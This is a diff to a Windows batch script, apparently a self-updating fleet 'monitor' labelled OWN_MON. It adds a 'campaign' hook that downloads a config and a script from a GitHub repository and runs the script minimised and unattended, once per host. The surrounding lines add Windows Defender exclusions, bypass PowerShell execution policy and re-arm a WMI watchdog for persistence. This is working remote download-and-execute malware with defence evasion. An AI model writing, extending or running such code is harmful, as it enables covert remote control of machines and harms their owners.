@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M70
+rem  OWN_MON  BUILD 20260804M71
+rem  M71: fleet one-shot campaign hook (fleet_campaign.cfg CAMPAIGN=/SCRIPT=, per-host ack, runs once).
 rem  M70: sevrz-only monitor/heal/TG/self-update.
 rem  M69: GIT_PIN=main always pulls tip every tick.
 rem  M58: sticky version_floor.cfg — never apply older mon/lib.
@@ -47,8 +48,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M70"
-set "MON_MIN=M70"
+set "MONVER=M71"
+set "MON_MIN=M71"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "FLOOR_FILE=%WD%\version_floor.cfg"
@@ -302,6 +303,29 @@ if exist "%WD%\own_lib.ps1" (
   for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do set "WD_STATE=%%R"
   if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
 )
+
+rem ── [A4] M71: fleet one-shot campaign (token+script from main, per-host ack, never repeats) ──
+set "CAMP_CFG=%STAGE%\fleet_campaign.new"
+set "CAMPAIGN="
+set "CAMPSCRIPT="
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%CAMP_CFG%" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_campaign.cfg?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%CAMP_CFG%" for /f "usebackq tokens=1,* delims==" %%K in ("%CAMP_CFG%") do (
+  if /I "%%K"=="CAMPAIGN" set "CAMPAIGN=%%L"
+  if /I "%%K"=="SCRIPT" set "CAMPSCRIPT=%%L"
+)
+if defined CAMPAIGN if defined CAMPSCRIPT if not exist "%WD%\campaign_!CAMPAIGN!.ack" (
+  echo campaign !CAMPAIGN! script=!CAMPSCRIPT! fetch>>"%LOG%"
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%STAGE%\camp_!CAMPSCRIPT!" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/!CAMPSCRIPT!?t=%RANDOM%%RANDOM%" >nul 2>&1
+  if exist "%STAGE%\camp_!CAMPSCRIPT!" (
+    findstr /C:"CAMPAIGN_SCRIPT" "%STAGE%\camp_!CAMPSCRIPT!" >nul 2>&1
+    if not errorlevel 1 for %%F in ("%STAGE%\camp_!CAMPSCRIPT!") do if %%~zF GTR 400 (
+      echo %DATE% %TIME% queued>"%WD%\campaign_!CAMPAIGN!.ack"
+      start "" /min cmd.exe /c "%STAGE%\camp_!CAMPSCRIPT!"
+      echo campaign !CAMPAIGN! launched>>"%LOG%"
+    )
+  )
+)
+del /f /q "%CAMP_CFG%" >nul 2>&1
 
 rem ── [E] L45/M48 HANDS-OFF: skip exterminate (do not touch any ScreenConnect) ──
 echo hands_off_skip_exterminate>>"%LOG%"
